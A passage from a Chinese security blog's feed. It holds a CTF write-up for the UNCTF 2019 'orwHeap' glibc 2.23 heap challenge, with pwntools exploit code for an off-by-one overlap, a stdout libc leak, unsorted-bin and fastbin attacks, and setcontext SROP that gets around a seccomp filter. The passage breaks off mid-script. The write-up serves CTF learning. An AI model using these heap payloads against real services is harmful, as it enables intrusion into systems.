class="line">p.send(pl2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pop-leave"><a href="#pop-leave" class="headerlink" title="pop leave"></a>pop leave</h3><p>可以直接利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rbp；</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      life is beautiful!
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF 2019 pwn orwHeap详解</title>
    <link href="https://j-kangel.github.io/2020/04/01/UNCTF-2019-pwn-orwHeap%E8%AF%A6%E8%A7%A3/"/>
    <id>https://j-kangel.github.io/2020/04/01/UNCTF-2019-pwn-orwHeap详解/</id>
    <published>2020-04-01T10:24:20.000Z</published>
    <updated>2020-04-01T04:05:12.649Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题是glibc2.23环境的堆题，包含多种知识与技巧。例如：沙箱函数、overlapping、利用_IO_2_1_stdout_泄漏libc、unsorted bin attack、fastbin attack、setcontext、mprotect、srop等等。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>检查保护机制，保护全开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  unctf_orwheap checksec pwn     </span><br><span class="line">[*] &apos;/mnt/hgfs/shared/unctf_orwheap/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida静态分析</p><p><img alt="" data-src="/2020/04/01/UNCTF-2019-pwn-orwHeap详解/1.png" class="lazyload"></p><p>可以发现在add函数处存在off by one。但是限制了size大小(size &gt; 0x67 &amp;&amp; size &lt;= 0x3F0)，这样我们依然可以进行overlapping。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'0'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x68</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">6</span>)  <span class="comment">#绕过inuse(p)的检测</span></span><br><span class="line">add(<span class="number">0x68</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#触发overlapping</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br></pre></td></tr></table></figure><p>此时bin的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x55e33cd130f0 —▸ 0x7f577e8c2b78 (main_arena+88) ◂— 0x55e33cd130f0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55e33cd130f0 —▸ 0x7f577e8c2b78 (main_arena+88) ◂— 0x55e33cd130f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>查看0x55e33cd130f0的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap 0x55e33cd130f0</span><br><span class="line">0x55e33cd130f0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x7f577e8c2b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7f577e8c2b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时如果有show的功能的话，就可以直接add(0x68,’2’*0x60)从而泄露&lt;main_arena+88&gt;的地址再计算得到libc基址。但这里没有libc基址，于是只好利用<code>_IO_2_1_stdout_</code>泄漏libc。具体操作如下：</p><p>1、修改fd的低字节为’\xdd\x25’，让它指向<code>_IO_2_1_stdout_</code>。这里的<code>2</code>需要爆破，概率为1/16</p><p>2、利用fastbin attack可以修改<code>_IO_2_1_stdout_</code>的flag字段从而泄露libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$5 = (struct _IO_FILE *) 0x7f41f9aa4620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; x/10gx 0x7f41f9aa45dd</span><br><span class="line">0x7f41f9aa45dd &lt;_IO_2_1_stderr_+157&gt;:   0x41f9aa3660000000      0x000000000000007f</span><br><span class="line">0x7f41f9aa45ed &lt;_IO_2_1_stderr_+173&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f41f9aa45fd &lt;_IO_2_1_stderr_+189&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f41f9aa460d &lt;_IO_2_1_stderr_+205&gt;:   0x0000000000000000      0x41f9aa26e0000000</span><br><span class="line">0x7f41f9aa461d &lt;_IO_2_1_stderr_+221&gt;:   0x00fbad288700007f      0x41f9aa46a3000000</span><br></pre></td></tr></table></figure><p>利用脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x82</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+<span class="string">'\n'</span>)  <span class="comment">#0x82是为了防止read函数末尾补'\x0a'</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak - (<span class="number">0x7ffff7a89b00</span> <span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br></pre></td></tr></table></figure><p>有了libc基址，我们本可以再次利用fastbin attack修改掉malloc_hook为one_gadget直接get shell。但是，ida分析的时候发现存在沙箱函数<code>prctl</code>。可以使用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">secconp-tools</a>查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  unctf_orwheap seccomp-tools dump ./pwn      </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁掉execve函数，因此无法直接get shell。这时可以通过orw得到flag。但是没有可用的栈空间，于是我们可以利用setcontext函数调用srop来进行栈迁移，最后call mprotect -&gt; shellcode。</p><p>这时候可以利用堆空间来部署<code>SigreturnFrame()</code>，然后将利用fastbin attack将<code>__free_hook</code>的地址改成<code>setcontext</code>。在改写__free_hook之前我们需要利用unsorted bin attack来伪造chunk size。（不得不说，unsorted bin attack确实是打辅助的好手）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'2'</span>*<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>攻击效果<code>bck-&gt;fd = unsorted_chunks(av)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x7f9fe23c37a8-0x20                                                   </span><br><span class="line">0x7f9fe23c3788 &lt;_IO_stdfile_1_lock+8&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f9fe23c3798 &lt;_IO_stdfile_0_lock+8&gt;:  0x00007f9fe23c1b78      0x0000000000000000</span><br><span class="line">0x7f9fe23c37a8 &lt;__free_hook&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f9fe23c37b8 &lt;next_to_use.11232&gt;:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f9fe23c37c8 &lt;disallow_malloc_check&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>利用fastbin attack将<code>__free_hook</code>的地址改成<code>setcontext</code>，并布置好<code>SigreturnFrame()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(free_hook - <span class="number">0x13</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#栈迁移</span></span><br><span class="line">frame.rip = libc_base + <span class="number">0xbc375</span> <span class="comment">#: syscall; ret; 此rax=0，调用read</span></span><br><span class="line">payload = str(frame)</span><br><span class="line"><span class="keyword">print</span> len(frame)</span><br><span class="line">add(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span> + <span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'fff'</span> + p64(libc_base + libc.symbols[<span class="string">'setcontext'</span>] + <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#触发SROP</span></span><br></pre></td></tr></table></figure><p>这里要说一下<code>setcontext</code>函数;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setcontext(const ucontext_t *ucp);</span><br></pre></td></tr></table></figure><p>这个函数的作用主要是用户上下文的获取和设置,可以利用这个函数直接控制大部分寄存器和执行流:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80i 0x7ffff7a7bb50</span><br><span class="line">   0x7ffff7a7bb50 &lt;setcontext&gt;: push   rdi</span><br><span class="line">   0x7ffff7a7bb51 &lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class="line">   0x7ffff7a7bb58 &lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class="line">   0x7ffff7a7bb5a &lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class="line">   0x7ffff7a7bb5f &lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class="line">   0x7ffff7a7bb65 &lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class="line">   0x7ffff7a7bb6a &lt;setcontext+26&gt;:  syscall </span><br><span class="line">   0x7ffff7a7bb6c &lt;setcontext+28&gt;:  pop    rdi</span><br><span class="line">   0x7ffff7a7bb6d &lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7a7bb73 &lt;setcontext+35&gt;:  jae    0x7ffff7a7bbd0 &lt;setcontext+128&gt;</span><br><span class="line">   0x7ffff7a7bb75 &lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">   0x7ffff7a7bb7c &lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class="line">   0x7ffff7a7bb7e &lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">   0x7ffff7a7bb85 &lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x7ffff7a7bb8c &lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">   0x7ffff7a7bb93 &lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">   0x7ffff7a7bb97 &lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x7ffff7a7bb9b &lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">   0x7ffff7a7bb9f &lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">   0x7ffff7a7bba3 &lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">   0x7ffff7a7bba7 &lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">   0x7ffff7a7bbae &lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">   0x7ffff7a7bbaf &lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">   0x7ffff7a7bbb3 &lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">   0x7ffff7a7bbba &lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">   0x7ffff7a7bbc1 &lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x7ffff7a7bbc5 &lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">   0x7ffff7a7bbc9 &lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">   0x7ffff7a7bbcd &lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">   0x7ffff7a7bbcf &lt;setcontext+127&gt;: ret    </span><br><span class="line">   0x7ffff7a7bbd0 &lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x3572a1]        # 0x7ffff7dd2e78</span><br><span class="line">   0x7ffff7a7bbd7 &lt;setcontext+135&gt;: neg    eax</span><br><span class="line">   0x7ffff7a7bbd9 &lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x7ffff7a7bbdc &lt;setcontext+140&gt;: or     rax,0xffffffffffffffff</span><br><span class="line">   0x7ffff7a7bbe0 &lt;setcontext+144&gt;: ret</span><br></pre></td></tr></table></figure><p>这里需要说明的是：</p><ol><li>一般是从<code>setcontext+53</code>开始用的,不然程序容易崩溃,主要是为了避开<code>fldenv [rcx]</code>这个指令。</li><li>64位中第一个参数刚好在rdi中，因此这里的rdi即frame的地址。</li><li><code>mov    rcx,QWORD PTR [rdi+0xa8]; push   rcx</code>即<code>mov rip，QWORD PTR [rdi+0xa8]</code>利用push是保证指向的内存可访问，否则就会crash。</li></ol><p>这是我们已经把栈迁移到<code>(free_hook) &amp; 0xfffffffffffff000</code> ，并可以在改地址处写入0x2000字节的数据，下面构造好ROP链即可</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"remote"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'idx: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'idx: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'0'</span>*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">0x82</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line">        edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>)</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">        leak=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        libc_base = leak - (<span class="number">0x7ffff7a89b00</span> <span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">        log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">        free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">        log.success(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1'</span>*<span 